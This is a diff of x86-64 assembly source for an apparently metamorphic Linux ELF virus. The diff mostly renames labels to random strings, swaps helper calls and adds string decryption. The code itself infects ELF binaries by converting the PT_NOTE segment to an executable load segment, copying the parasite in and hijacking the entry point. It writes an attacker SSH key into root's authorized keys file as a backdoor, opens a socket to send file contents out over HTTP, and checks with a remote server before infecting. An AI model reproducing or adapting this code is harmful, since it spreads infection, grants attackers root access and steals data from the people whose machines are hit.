-	_find_memory_eof:
-		mov r14, INF(infection.map_addr)
-		movzx rax, word [r14 + elf64_ehdr.e_shnum]
+KAyyrb7qJ2:
+mov r14, INF(X703hy1rZ.jS6sH4kx)
+movzx rax, word [r14 + w0adOh4j9A.GtDX9]
 push rax
 push r14
-push  qword [r14 + elf64_ehdr.e_shoff]
+push qword [r14 + w0adOh4j9A.GGUrI]
 call add1
 add rsp, 8
 pop r14
 mov r14, rax
 pop rax
-		xor rcx, rcx
-		_find_mem_eof_loop:
-			cmp rcx, rax
-			jge _find_mem_eof_end
+xor rcx, rcx
+ex29yQO:
+cmp rcx, rax
+jge Is8f8NWby7
 push rax
-push  qword [r14 + elf64_shdr.sh_addr]
-call mov4
+push qword [r14 + TzeIKi.wXBJbu0]
+call mov1
 add rsp, 8
 mov rbx, rax
 pop rax
 push rax
 push rbx
-push  qword [r14 + elf64_shdr.sh_size]
+push qword [r14 + TzeIKi.S1ehM]
 call add1
 add rsp, 8
 pop rbx
 mov rbx, rax
 pop rax
-			cmp INF(infection.mem_eof), rbx
-			jge _find_mem_eof_continue
+cmp INF(X703hy1rZ.gyLo4iIdVn), rbx
+jge t0ZWko77MU
 push rax
-push  rbx
+push rbx
 call mov2
 add rsp, 8
-mov INF(infection.mem_eof), rax
+mov INF(X703hy1rZ.gyLo4iIdVn), rax
 pop rax
-		_find_mem_eof_continue:
+t0ZWko77MU:
 push rax
 push r14
-push  elf64_shdr_size
+push TzeIKi_size
 call add1
 add rsp, 8
 pop r14
 mov r14, rax
 pop rax
-			inc rcx
-			jmp _find_mem_eof_loop
-		_find_mem_eof_end:
-	_find_pt_note:
-	; r14	-> segmentS header
-	; rcx	== segment counter
-		mov r14, INF(infection.map_addr)
-		movzx rax, word [r14 + elf64_ehdr.e_phnum]
+inc rcx
+jmp ex29yQO
+Is8f8NWby7:
+sYTTZd:
+; r14 -> segmentS header
+; rcx == segment counter
+mov r14, INF(X703hy1rZ.jS6sH4kx)
+movzx rax, word [r14 + w0adOh4j9A.sqnXrEEphp]
 push rax
 push r14
-push  qword [r14 + elf64_ehdr.e_phoff]
+push qword [r14 + w0adOh4j9A.WC98s6]
 call add1
 add rsp, 8
 pop r14
 mov r14, rax
 pop rax
-		xor rcx, rcx
-		_find_pt_note_loop:
-			cmp rcx, rax
-			jge _find_pt_note_loop_end
-cmp dword [r14 + elf64_phdr.p_type], PT_NOTE 
-			je _mutate_pt_note_seg
-		_find_pt_note_loop_continue:
+xor rcx, rcx
+Y1keZYoe:
+cmp rcx, rax
+jge cTnsvrA
+cmp dword [r14 + l8FG12Pyo.kI8GKGmN], PT_NOTE 
+je sZRceSEDk
+heHy7qO:
 push rax
 push r14
-push  elf64_phdr_size
+push l8FG12Pyo_size
 call add1
 add rsp, 8
 pop r14
 mov r14, rax
 pop rax
-			inc rcx
-			jmp _find_pt_note_loop
-		_find_pt_note_loop_end:
+inc rcx
+jmp Y1keZYoe
+cTnsvrA:
 push rax
-push  -1
-call mov1
+push -1
+call mov3
 add rsp, 8
 mov r14, rax
 pop rax
-	_mutate_pt_note_seg:
-	; r14	-> segment header
-	; rax	== new offset / address
+sZRceSEDk:
+; r14 -> segment header
+; rax == new offset / address
 cmp r14, 0 
-		jl	_update_final_jump
-mov dword [r14 + elf64_phdr.p_type], PT_LOAD 
-mov qword [r14 + elf64_phdr.p_flags], PF_X | PF_R 
-mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
-mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
-mov qword [r14 + elf64_phdr.p_align], PAGE_SIZE 
-		mov rax, INF(infection.original_end)
+jl NABTH
+mov dword [r14 + l8FG12Pyo.kI8GKGmN], PT_LOAD 
+mov qword [r14 + l8FG12Pyo.SpCJOKQQ], PF_X | PF_R 
+mov qword [r14 + l8FG12Pyo.tnsaLRfc], CODE_LEN 
+mov qword [r14 + l8FG12Pyo.Ei8V6], CODE_LEN 
+mov qword [r14 + l8FG12Pyo.kPy7P], PAGE_SIZE 
+mov rax, INF(X703hy1rZ.qLMmjsLc)
 push rax
-push  PAGE_SIZE
+push PAGE_SIZE
 call add1
 add rsp, 8
 add rsp, 8
-		and rax, -4096
-		mov qword [r14 + elf64_phdr.p_offset], rax
-		mov qword INF(infection.injection_offset), rax
-		mov rax, INF(infection.mem_eof)
+and rax, -4096
+mov qword [r14 + l8FG12Pyo.IjAqzlaXw], rax
+mov qword INF(X703hy1rZ.F4vJxi7), rax
+mov rax, INF(X703hy1rZ.gyLo4iIdVn)
 push rax
-push  PAGE_SIZE
+push PAGE_SIZE
 call add1
 add rsp, 8
 add rsp, 8
-		and rax, -4096
-		mov qword INF(infection.injection_addr), rax
-		mov qword [r14 + elf64_phdr.p_vaddr], rax
-		mov qword [r14 + elf64_phdr.p_paddr], rax
-_infection:
-	_update_elf_hdr:
-	; r8	-> elf header entrypoint
-	; r9	== end of segment + align (injection offset)
-	; r10	== injection offset
-		mov r8, INF(infection.map_addr)
+and rax, -4096
+mov qword INF(X703hy1rZ.rM6Aog), rax
+mov qword [r14 + l8FG12Pyo.Sol8RvYWh], rax
+mov qword [r14 + l8FG12Pyo.pVIHw], rax
+faawz:
+Ay9C3bmm:
+; r8 -> elf header entrypoint
+; r9 == end of segment + align (injection offset)
+; r10 == injection offset
+mov r8, INF(X703hy1rZ.jS6sH4kx)
 push rax
 push r8
-push  elf64_ehdr.e_entry
+push w0adOh4j9A.bmF8Q2
 call add1
 add rsp, 8
 pop r8
 mov r8, rax
 pop rax
-		mov r10, INF(infection.injection_addr)
+mov r10, INF(X703hy1rZ.rM6Aog)
 push rax
-push  r10
-call mov3
+push r10
+call mov4
 add rsp, 8
 mov [r8], rax
 pop rax
-cmp byte INF(infection.add_page), 0 
-		jg _copy_parasite
+cmp byte INF(X703hy1rZ.GkEOkKIOr), 0 
+jg KhvYPcx23
 push rax
-push  CODE_LEN
-call mov4
+push CODE_LEN
+call mov2
 add rsp, 8
 mov rdi, rax
 pop rax
-		call _update_seg_sizes
-	_copy_parasite:
-	; rdi	-> injection start
-	; rsi	-> parasite _start
-	; rcx	== code len (_end - _start)
-		mov rdi, INF(infection.map_addr)
-		add rdi, INF(infection.injection_offset)
-		;  rsi -> start of our code
-		lea rsi, [rel _start]					
+call U341P
+KhvYPcx23:
+; rdi -> injection start
+; rsi -> parasite _start
+; rcx == code len (IDsDM - _start)
+mov rdi, INF(X703hy1rZ.jS6sH4kx)
+add rdi, INF(X703hy1rZ.F4vJxi7)
+; rsi -> start of our code
+lea rsi, [rel _start] 
 push rax
-push  CODE_LEN
-call mov3
+push CODE_LEN
+call mov4
 add rsp, 8
 mov rcx, rax
 pop rax
-		;  copy from _start to _end (= !std)
-		cld										
-		rep movsb
-	_update_final_jump:
-	; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
-	; r9 == distance to jump from final jump to original entry point
-		mov r8, INF(infection.map_addr)
-		add r8, INF(infection.injection_offset)
+; copy from _start to IDsDM (= !std)
+cld 
+rep movsb
+NABTH:
+; r8 -> bzU1m8e instruction's addr (bzU1m8e + 1)
+; r9 == distance to jump from final jump to original entry point
+mov r8, INF(X703hy1rZ.jS6sH4kx)
+add r8, INF(X703hy1rZ.F4vJxi7)
 push rax
 push r8
-push  FINJMP_OFF
+push FINJMP_OFF
 call add1
 add rsp, 8
 pop r8
 mov r8, rax
 pop rax
-		inc r8
-		mov r10, INF(infection.injection_addr)
+inc r8
+mov r10, INF(X703hy1rZ.rM6Aog)
 push rax
 push r10
-push  FINJMP_OFF
+push FINJMP_OFF
 call add1
 add rsp, 8
 pop r10
@@ -1052,92 +1085,110 @@ mov r10, rax
 pop rax
 push rax
 push r10
-push  0x05
+push 0x05
 call add1
 add rsp, 8
 pop r10
 mov r10, rax
 pop rax
-		mov r9, INF(infection.original_entry)
-		sub r9, r10
-		mov [r8], r9d
-		jmp _unmap_close_inf
-_update_seg_sizes:
-; r8	-> segment header data
-;*r14	-> segment header in header table
-	mov r8, INF(infection.seg_hdr_addr)
-	;  save header start for later
-	push r8											
-	; * Update file size *
+mov r9, INF(X703hy1rZ.zsfLTcza)
+sub r9, r10
+mov [r8], r9d
+jmp jc6dsjkGsi
+U341P:
+; r8 -> segment header data
+;*r14 -> segment header in header table
+mov r8, INF(X703hy1rZ.WVWWfydEhR)
+; save header start for later
+push r8 
+; * Update file size *
 push rax
 push r8
-push  qword elf64_phdr.p_filesz
+push qword l8FG12Pyo.tnsaLRfc
 call add1
 add rsp, 8
 pop r8
 mov r8, rax
 pop rax
-	add qword [r8], rdi
-	pop r8
-	; * Update memory size *
+add qword [r8], rdi
+pop r8
+; * Update memory size *
 push rax
 push r8
-push  elf64_phdr.p_memsz
+push l8FG12Pyo.Ei8V6
 call add1
 add rsp, 8
 pop r8
 mov r8, rax
 pop rax
-	add qword [r8], rdi
-	ret
+add qword [r8], rdi
+ret
 ; --- privesc + backdoor
-_backdoor:
-    ; open "/root/.ssh/authorized.key"
-    ; r9 == fd
-    push rbp
-    mov rbp, rsp
+fgHC3O2HCz:
+; open "/root/.ssh/authorized.key"
+; r9 == rwpA8dhMq
+push rbp
+mov rbp, rsp
 sub rsp, 0x1000 
-push  SYS_OPEN
+push SYS_OPEN
+call mov3
+add rsp, 8
+; mov rdi, XdOzA0DA
+lea rdi, [rel XdOzA0DA]
+push rax
+push rsi
+push rax
+push W2nvO
 call mov1
 add rsp, 8
-    ; mov rdi, sshFile
-    lea rdi, [rel sshFile]
+mov rsi, rax
+pop rax
+oTRSYOwg:
+call _decrypt_str
 push rax
-push  O_RDWR | O_CREAT
+push rax
+call mov3
+add rsp, 8
+mov rdi, rax
+pop rax
+pop rsi
+pop rax
+push rax
+push O_RDWR | O_CREAT
 call mov2
 add rsp, 8
 mov rsi, rax
 pop rax
 push rax
-push  600
+push 600
 call mov1
 add rsp, 8
 mov rdx, rax
 pop rax
-    syscall
-    test rax, rax
-    js _returnLeave
+syscall
+test rax, rax
+js aOvfi3N4
 push rax
-push  rax
-call mov3
+push rax
+call mov4
 add rsp, 8
 mov r9, rax
 pop rax
-    _readSsh:
-        ; *r9 == fd
-        ; r10 == size read
-        ; rsi -> buffer
-push  SYS_READ
-call mov2
+g8CpurWzWK:
+; *r9 == rwpA8dhMq
+; r10 == size read
+; rsi -> buffer
+push SYS_READ
+call mov1
 add rsp, 8
 push rax
-push  r9
-call mov4
+push r9
+call mov2
 add rsp, 8
 mov rdi, rax
 pop rax
 push rax
-push  rbp
+push rbp
 call mov3
 add rsp, 8
 mov rsi, rax
@@ -1149,416 +1200,473 @@ movq r15, xmm15
 movzx r14, byte [r15 + 41]
 shl r14, 0x18
 push rax
-push  r14
-call mov1
+push r14
+call mov4
 add rsp, 8
 mov rdx, rax
 pop rax
-movzx r14, byte [r15 + 165]
+movzx r14, byte [r15 + 157]
 shl r14, 0x10
-or  rdx, r14 
-movzx r14, byte [r15 + 289]
+or rdx, r14 
+movzx r14, byte [r15 + 273]
 shl r14, 0x8
-or  rdx, r14 
-movzx r14, byte [r15 + 413]
-or  rdx, r14 
+or rdx, r14 
+movzx r14, byte [r15 + 389]
+or rdx, r14 
 pop r14
 pop r15
-        syscall
+syscall
 cmp rax, 0 
-        je _notFound
-        jl _closeSsh
+je kVAZBsy
+jl rnlKVA4m
 push rax
-push  rax
-call mov2
+push rax
+call mov1
 add rsp, 8
 mov r10, rax
 pop rax
-    _checkBackdoor:
-        ; rcx == nombre d'octet lue
-        ; r11 -> buffer
+XZHOwoCL:
+; rcx == nombre d'octet lue
+; r11 -> buffer
 push rax
-push  r10
+push r10
 call mov4
 add rsp, 8
 mov rcx, rax
 pop rax
 push rax
-push  rsi
+push rsi
 call mov3
 add rsp, 8
 mov r11, rax
 pop rax
-        ; for every new line
-        _findNewline:
+; for every new line
+YjN7fU:
 cmp byte [r11], 0xa 
-            je _cmpLine
-            inc r11
-            loop _findNewline
-push  SYS_WRITE
+je g6mqk
+inc r11
+loop YjN7fU
+push SYS_WRITE
 call mov2
 add rsp, 8
 push rax
-push  back
-call mov4
+push KnlWTHf
+call mov1
 add rsp, 8
 mov rsi, rax
 pop rax
 push rax
-push  1
-call mov1
+push 1
+call mov3
 add rsp, 8
 mov rdx, rax
 pop rax
-            syscall
-            jmp _notFound
-            ; cmp the line with pub ssh key
-            _cmpLine:
+syscall
+jmp kVAZBsy
+; cmp the line with pub ssh I9h3dTtNKW
+g6mqk:
 mov byte [r11], 0 
 push rax
-push  r11
-call mov2
-add rsp, 8
-mov rdi, rax
-pop rax
-sub rdi, sshPubLen - 1 
-                lea rsi, [rel sshPub]
-                push rcx
-                call _strcmp
-                pop rcx
-                test rax, rax            
-                je _closeSsh
-                inc r11
-				dec rcx
-				jnz _findNewline
-                ; loop _findNewline
-        ; if not found write it
-        _notFound:
-push rax
-push  r9
-call mov1
-add rsp, 8
-mov rdi, rax
-pop rax
-push  SYS_WRITE
-call mov3
-add rsp, 8
-            lea rsi, [rel sshPub]
-push rax
-push  sshPubLen - 1
+push r11
 call mov4
 add rsp, 8
-mov rdx, rax
-pop rax
-            syscall
-push  SYS_WRITE
-call mov2
-add rsp, 8
-            lea rsi, [rel back]
-push rax
-push  1
-call mov1
-add rsp, 8
-mov rdx, rax
-pop rax
-            syscall
-    _closeSsh:
-push  SYS_CLOSE
-call mov4
-add rsp, 8
-push rax
-push  r9
-call mov3
-add rsp, 8
 mov rdi, rax
 pop rax
-        syscall
-        ; 
-        jmp _returnLeave
-_initSocket:
-    _creatSocket:
-push  SYS_SOCKET
-call mov2
-add rsp, 8
+sub rdi, B197bFv91K - 1 
+lea rsi, [rel JzE82]
 push rax
-push  AF_INET
-call mov1
-add rsp, 8
-mov rdi, rax
-pop rax
+push rdi
+lea rdi, [rel JzE82]
 push rax
-push  SOCK_STREAM
-call mov4
-add rsp, 8
-mov rsi, rax
-pop rax
-        xor rdx, rdx
-        syscall
-        test rax, rax
-        js _return
-push rax
-push  rax
-call mov3
-add rsp, 8
-mov rdi, rax
-pop rax
-    _connectSocket:
-push  SYS_CONNECT
-call mov1
-add rsp, 8
-        lea rsi, [rel sockaddr]
-push rax
-push  16
-call mov2
-add rsp, 8
-mov rdx, rax
-pop rax
-        syscall
-        test rax, rax
-        js _closeSock
-push  rdi
-call mov3
-add rsp, 8
-        ret
-_munmapExtractBuffer:
-push  SYS_UNMAP
-call mov4
-add rsp, 8
-push rax
-push  rsi
-call mov1
-add rsp, 8
-mov rdi, rax
-pop rax
-push rax
-push  rdx
+push B197bFv91K
 call mov2
 add rsp, 8
 mov rsi, rax
 pop rax
-    syscall
-    pop rdi
+gY44K:
+call _decrypt_str
+push rax
+push rax
+call mov2
+add rsp, 8
+mov rsi, rax
+pop rax
+pop rdi
+pop rax
+push rcx
+call CvLYMAYQ5
+pop rcx
+test rax, rax 
+je rnlKVA4m
+inc r11
+dec rcx
+jnz YjN7fU
+; loop YjN7fU
+; if not found write it
+kVAZBsy:
+push rax
+push r9
+call mov1
+add rsp, 8
+mov rdi, rax
+pop rax
+push SYS_WRITE
+call mov3
+add rsp, 8
+lea rsi, [rel JzE82]
+push rax
+push rdi
+lea rdi, [rel JzE82]
+push rax
+push B197bFv91K
+call mov4
+add rsp, 8
+mov rsi, rax
+pop rax
+e3gRcq:
+call _decrypt_str
+push rax
+push rax
+call mov1
+add rsp, 8
+mov rsi, rax
+pop rax
+pop rdi
+pop rax
+push rax
+push B197bFv91K - 1
+call mov3
+add rsp, 8
+mov rdx, rax
+pop rax
+syscall
+push SYS_WRITE
+call mov2
+add rsp, 8
+lea rsi, [rel KnlWTHf]
+push rax
+push rdi
+lea rdi, [rel KnlWTHf]
+push rax
+push B197bFv91K
+call mov4
+add rsp, 8
+mov rsi, rax
+pop rax
+w97MDxH:
+call _decrypt_str
+push rax
+push rax
+call mov2
+add rsp, 8
+mov rsi, rax
+pop rax
+pop rdi
+pop rax
+push rax
+push 1
+call mov4
+add rsp, 8
+mov rdx, rax
+pop rax
+syscall
+rnlKVA4m:
+push SYS_CLOSE
+call mov1
+add rsp, 8
+push rax
+push r9
+call mov3
+add rsp, 8
+mov rdi, rax
+pop rax
+syscall
+; 
+jmp aOvfi3N4
+fsH2ZWOpip:
+NRG7leLgHL:
+push SYS_SOCKET
+call mov4
+add rsp, 8
+push rax
+push AF_INET
+call mov1
+add rsp, 8
+mov rdi, rax
+pop rax
+push rax
+push SOCK_STREAM
+call mov2
+add rsp, 8
+mov rsi, rax
+pop rax
+xor rdx, rdx
+syscall
+test rax, rax
+js Yn887ponP
+push rax
+push rax
+call mov3
+add rsp, 8
+mov rdi, rax
+pop rax
+txN25:
+push SYS_CONNECT
+call mov3
+add rsp, 8
+lea rsi, [rel Ap5WD2EbFi]
+push rax
+push 16
+call mov1
+add rsp, 8
+mov rdx, rax
+pop rax
+syscall
+test rax, rax
+js Ozm651xmq
+push rdi
+call mov2
+add rsp, 8
+ret
+CeH5F:
+push SYS_UNMAP
+call mov4
+add rsp, 8
+push rax
+push rsi
+call mov1
+add rsp, 8
+mov rdi, rax
+pop rax
+push rax
+push rdx
+call mov2
+add rsp, 8
+mov rsi, rax
+pop rax
+syscall
+pop rdi
 ; (rdi: socket)
-_closeSock:
-push  SYS_CLOSE
+Ozm651xmq:
+push SYS_CLOSE
 call mov4
 add rsp, 8
-    syscall
-push  -1
+syscall
+push -1
 call mov3
 add rsp, 8
-    ret
+ret
 ; extrait les donnees des fichiers via http
-_extractData:
-    ;  r12 -> maped file_date
+hLpiGpf:
+; r12 -> maped file_date
 push rax
-push  rax
-call mov3
+push rax
+call mov4
 add rsp, 8
 mov r12, rax
 pop rax
-    push rsi
-    call _creatSocket
-    pop rsi
+push rsi
+call NRG7leLgHL
+pop rsi
 push rax
-push  rax
-call mov2
+push rax
+call mov3
 add rsp, 8
 mov r13, rax
 pop rax
-    _checkFd:
+O0RFoUW5:
 cmp r13, 0 
-        jl _return
-    _mmapBuffer:
-    ; rax -> mmap buffer
-    ; r15 == la size du mmap buffer
-    ; r12 -> maped file_data
-push  SYS_MMAP
-call mov4
-add rsp, 8
-        xor rdi, rdi
-        push rsi
-push rax
-push rsi
-push  headerStartLen
-call add1
-add rsp, 8
-pop rsi
-mov rsi, rax
-pop rax
-push rax
-push rsi
-push  headerEndLen
-call add1
-add rsp, 8
-pop rsi
-mov rsi, rax
-pop rax
-push rax
-push rsi
-push  10
-call add1
-add rsp, 8
-pop rsi
-mov rsi, rax
-pop rax
-push rax
-push  rsi
+jl Yn887ponP
+gChF0SV:
+; rax -> mmap buffer
+; r15 == la size du mmap buffer
+; r12 -> maped file_data
+push SYS_MMAP
 call mov1
+add rsp, 8
+xor rdi, rdi
+push rsi
+push rax
+push rsi
+push nUQR8D
+call add1
+add rsp, 8
+pop rsi
+mov rsi, rax
+pop rax
+push rax
+push rsi
+push hhcTDSu
+call add1
+add rsp, 8
+pop rsi
+mov rsi, rax
+pop rax
+push rax
+push rsi
+push 10
+call add1
+add rsp, 8
+pop rsi
+mov rsi, rax
+pop rax
+push rax
+push rsi
+call mov2
 add rsp, 8
 mov r15, rax
 pop rax
 push rax
-push  PROT_READ | PROT_WRITE
-call mov2
+push PROT_READ | PROT_WRITE
+call mov1
 add rsp, 8
 mov rdx, rax
 pop rax
 push rax
-push  MAP_PRIVATE | MAP_ANONYMOUS
-call mov3
+push MAP_PRIVATE | MAP_ANONYMOUS
+call mov4
 add rsp, 8
 mov r10, rax
 pop rax
-        xor r8, r8
-        xor r9, r9
-        syscall
-    _copyData:
-        ; r14 -> header buffer
-        ; *r15 == la taille du mmap buffer
+xor r8, r8
+xor r9, r9
+syscall
+s5rvi3:
+; r14 -> header buffer
+; *r15 == la taille du mmap buffer
 push rax
-push  rax
-call mov1
+push rax
+call mov2
 add rsp, 8
 mov r14, rax
 pop rax
 push rax
-push  rax
-call mov4
-add rsp, 8
-mov rsi, rax
-pop rax
-        lea rdi, [rel headerStart]
-        call _strcpy
-        pop rax
-        push rax
 push rax
-push rsi
-push  headerStartLen - 1
-call add1
-add rsp, 8
-pop rsi
-mov rsi, rax
-pop rax
-        call _itoa
-        lea rdi, [rel headerEnd]
-        call _strcpy
-push rax
-push rsi
-push  headerEndLen - 1
-call add1
-add rsp, 8
-pop rsi
-mov rsi, rax
-pop rax
-push rax
-push  r12
-call mov1
-add rsp, 8
-mov rdi, rax
-pop rax
-        pop rcx
-        call _strncpy
-    _sendTo:
-push  SYS_SENDTO
-call mov2
-add rsp, 8
-push rax
-push  r13
-call mov4
-add rsp, 8
-mov rdi, rax
-pop rax
-push rax
-push  r14
 call mov3
 add rsp, 8
 mov rsi, rax
 pop rax
+lea rdi, [rel rKANABrqt]
+call HOmW8jN
+pop rax
 push rax
-push  r15
+push rax
+push rsi
+push nUQR8D - 1
+call add1
+add rsp, 8
+pop rsi
+mov rsi, rax
+pop rax
+call nQScOYAb
+lea rdi, [rel SKasW]
+call HOmW8jN
+push rax
+push rsi
+push hhcTDSu - 1
+call add1
+add rsp, 8
+pop rsi
+mov rsi, rax
+pop rax
+push rax
+push r12
 call mov4
+add rsp, 8
+mov rdi, rax
+pop rax
+pop rcx
+call HUs658Gp
+Kr11z1KLV:
+push SYS_SENDTO
+call mov2
+add rsp, 8
+push rax
+push r13
+call mov3
+add rsp, 8
+mov rdi, rax
+pop rax
+push rax
+push r14
+call mov1
+add rsp, 8
+mov rsi, rax
+pop rax
+push rax
+push r15
+call mov1
 add rsp, 8
 mov rdx, rax
 pop rax
-        xor r10, r10
-        xor r9, r9
-        syscall
-        push rdi
-        jmp _munmapExtractBuffer
-; manage infection
-_isInfectionAllow:
-    push rbp
-    mov rbp, rsp 
-    call _creatSocket
+xor r10, r10
+xor r9, r9
+syscall
+push rdi
+jmp CeH5F
+; manage X703hy1rZ
+d7QXlhSKMh:
+push rbp
+mov rbp, rsp 
+call NRG7leLgHL
 cmp rax, 0 
-    jl _allow
-    _sendInfectionRequest:
-        ;rdi == sockfd
+jl HzchUX
+pzQcUhG0n:
+;rdi == sockfd
 push rax
-push  rax
+push rax
 call mov2
 add rsp, 8
 mov rdi, rax
 pop rax
-push  SYS_SENDTO
+push SYS_SENDTO
 call mov3
 add rsp, 8
-        lea rsi, [rel headerGet]
+lea rsi, [rel XTZsIZO]
 push rax
-push  headerGetLen
-call mov1
+push YOFxT
+call mov4
 add rsp, 8
 mov rdx, rax
 pop rax
-        xor r10, r10
-        xor r9, r9
-        syscall
-        test rax, rax
-        js _allow
-    _nanoSleep:
-        push rdi
-push  35
-call mov3
+xor r10, r10
+xor r9, r9
+syscall
+test rax, rax
+js HzchUX
+QQ1s8v6Ab:
+push rdi
+push 35
+call mov2
 add rsp, 8
-        lea rdi, [rel timespec]
-        xor rsi, rsi
-        syscall
-        pop rdi
-    _recvInfectionRequest:
-        ;* rdi == sockfd
-push  SYS_RECVFROM
-call mov1
+lea rdi, [rel vJBLbia]
+xor rsi, rsi
+syscall
+pop rdi
+KvRQy:
+;* rdi == sockfd
+push SYS_RECVFROM
+call mov4
 add rsp, 8
 sub rsp, 200 
-        mov rsi, rsp
+mov rsi, rsp
 push rax
-push  200
-call mov4
+push 200
+call mov1
 add rsp, 8
 mov rdx, rax
 pop rax
-        xor r10, r10
-        syscall
-        test rax, rax
-        js _allow
-    _infectionRequestRespons:
-        ;* rdi == sockfd
-        mov rsi, rsp
-        call _strlen
+xor r10, r10
+syscall
+test rax, rax
+js HzchUX
+pvk7bC6:
+;* rdi == sockfd
+mov rsi, rsp
+call lzPBWI0L
 push rax
 push rsp
-push  rax
+push rax
 call add1
 add rsp, 8
 pop rsp
@@ -1566,19 +1674,19 @@ mov rsp, rax
 pop rax
 sub rsp, 2 
 cmp WORD [rsp], 0x4b4f 
-        jne _notAllow
-    _allow:
-        call _closeSock
-push  0
+jne IrtqLUNF
+HzchUX:
+call Ozm651xmq
+push 0
+call mov3
+add rsp, 8
+jmp aOvfi3N4
+IrtqLUNF:
+call Ozm651xmq
+push -1
 call mov2
 add rsp, 8
-        jmp _returnLeave
-    _notAllow:
-        call _closeSock
-push  -1
-call mov1
-add rsp, 8
-        jmp _returnLeave
+jmp aOvfi3N4
 ;;**;;
 mov2:
 push rcx
@@ -1596,22 +1704,10 @@ push rcx
 push rdx
 mov rcx, qword [rsp + 8 + 16]
 
-mov rdx, (64 << 8) | 0  ; flag pour le mov de bextr
+mov rdx, (64 << 8) | 0 ; flag pour le mov de bextr
 bextr rax, rcx, rdx ; mov rax, rcx
 
 pop rdx
-pop rcx
-ret
-mov3:
-push rcx
-push rbx
-mov rbx, qword [rsp + 8 + 16]
-
-mov rax, 0
-mov rcx, 0x3d42f
-cmpxchg rbx, rcx
-
-pop rbx
 pop rcx
 ret
 mov4:
@@ -1626,21 +1722,33 @@ mov rax, rbx
 pop rcx
 pop rbx
 ret
+mov3:
+push rcx
+push rbx
+mov rbx, qword [rsp + 8 + 16]
+
+mov rax, 0
+mov rcx, 0x3d42f
+cmpxchg rbx, rcx
+
+pop rbx
+pop rcx
+ret
 add1:
 push rcx
 mov rax, qword [rsp + 16 + 8]
 mov rcx, qword [rsp + 8 + 8]
 
-test rcx, rcx   ;  is rcx == 0 ?
+test rcx, rcx ; is rcx == 0 ?
 jnz sub
 jnc do_adc
 jmp reverseCF
 
 sub:
 sub rcx, 1
-jnc reverseCF   ; Jump if Carry Flag is Not set (CF=0)
-jmp do_adc  ; Jump to ADC instruction
-reverseCF:   
+jnc reverseCF ; Jump if Carry Flag is Not set (CF=0)
+jmp do_adc ; Jump to ADC instruction
+reverseCF: 
 cmc ; Complement CF, making it 1
 do_adc: ; Perform ADC with prepared carry flag
 adc rax, rcx; RAX = RAX + rcx + CF
@@ -1649,56 +1757,56 @@ pop rcx
 ret
 ; rax: int *_map_int_table( void )
 _map_int_table:
-	; rax	-> new map
-	push rdi
-	push rsi
+; rax -> new map
+push rdi
+push rsi
 push rdx
 push r10
 push r8
 push r9
-push  SYS_MMAP
-call mov4
+push SYS_MMAP
+call mov1
 add rsp, 8
 push rax
-push  0x0
-call mov2
+push 0x0
+call mov4
 add rsp, 8
 mov rdi, rax
 pop rax
 push rax
-push  0x1f0
+push 0x1d0
 call mov3
 add rsp, 8
 mov rsi, rax
 pop rax
 push rax
-push  PROT_READ | PROT_WRITE
-call mov2
+push PROT_READ | PROT_WRITE
+call mov4
 add rsp, 8
 mov rdx, rax
 pop rax
 push rax
-push  0x22
+push 0x22
 call mov3
 add rsp, 8
 mov r10, rax
 pop rax
 push rax
-push  -1
-call mov4
+push -1
+call mov2
 add rsp, 8
 mov r8, rax
 pop rax
 push rax
-push  0x0
+push 0x0
 call mov1
 add rsp, 8
 mov r9, rax
 pop rax
-	syscall
-	cmp rax, -1
-	jl _end_map_int
-	movq xmm15, rax
+syscall
+cmp rax, -1
+jl _end_map_int
+movq xmm15, rax
 mov dword [rax + 0], 0x00000000
 mov dword [rax + 4], 0x00000000
 mov dword [rax + 8], 0x00000000
@@ -1734,9 +1842,9 @@ mov dword [rax + 124], 0x00000000
 mov dword [rax + 128], 0x00000000
 mov dword [rax + 132], 0x00000000
 mov dword [rax + 136], 0x00000000
-mov dword [rax + 140], 0x00000000
+mov dword [rax + 140], 0x00460000
 mov dword [rax + 144], 0x00000000
-mov dword [rax + 148], 0x00460000
+mov dword [rax + 148], 0x00000000
 mov dword [rax + 152], 0x00000000
 mov dword [rax + 156], 0x00000000
 mov dword [rax + 160], 0x00000000
@@ -1751,78 +1859,70 @@ mov dword [rax + 192], 0x00000000
 mov dword [rax + 196], 0x00000000
 mov dword [rax + 200], 0x00000000
 mov dword [rax + 204], 0x00000000
-mov dword [rax + 208], 0x00000000
+mov dword [rax + 208], 0x00000098
 mov dword [rax + 212], 0x00000000
 mov dword [rax + 216], 0x00000000
 mov dword [rax + 220], 0x00000000
-mov dword [rax + 224], 0x00000098
-mov dword [rax + 228], 0x00000000
+mov dword [rax + 224], 0x00000000
+mov dword [rax + 228], 0x02030000
 mov dword [rax + 232], 0x00000000
 mov dword [rax + 236], 0x00000000
 mov dword [rax + 240], 0x00000000
-mov dword [rax + 244], 0x00030000
+mov dword [rax + 244], 0x00000000
 mov dword [rax + 248], 0x00000000
 mov dword [rax + 252], 0x00000000
-mov dword [rax + 256], 0x00000000
+mov dword [rax + 256], 0x004c0000
 mov dword [rax + 260], 0x00000000
 mov dword [rax + 264], 0x00000000
 mov dword [rax + 268], 0x00000000
-mov dword [rax + 272], 0x004c0000
+mov dword [rax + 272], 0x00021000
 mov dword [rax + 276], 0x00000000
 mov dword [rax + 280], 0x00000000
 mov dword [rax + 284], 0x00000000
-mov dword [rax + 288], 0x00021000
-mov dword [rax + 292], 0x00000000
+mov dword [rax + 288], 0x00000000
+mov dword [rax + 292], 0x0000004b
 mov dword [rax + 296], 0x00000000
 mov dword [rax + 300], 0x00000000
 mov dword [rax + 304], 0x00000000
-mov dword [rax + 308], 0x0000004b
-mov dword [rax + 312], 0x00000000
+mov dword [rax + 308], 0x40000000
+mov dword [rax + 312], 0x0000001f
 mov dword [rax + 316], 0x00000000
 mov dword [rax + 320], 0x00000000
-mov dword [rax + 324], 0x40000000
-mov dword [rax + 328], 0x0000001f
+mov dword [rax + 324], 0x00000096
+mov dword [rax + 328], 0x00000000
 mov dword [rax + 332], 0x00000000
 mov dword [rax + 336], 0x00000000
 mov dword [rax + 340], 0x00000000
-mov dword [rax + 344], 0x00000000
-mov dword [rax + 348], 0x00000096
-mov dword [rax + 352], 0x00000000
-mov dword [rax + 356], 0x00000000
-mov dword [rax + 360], 0x00000000
-mov dword [rax + 364], 0x00000000
-mov dword [rax + 368], 0x06540000
-mov dword [rax + 372], 0x6e000040
-mov dword [rax + 376], 0x00000001
-mov dword [rax + 380], 0x00000101
-mov dword [rax + 384], 0x2e010100
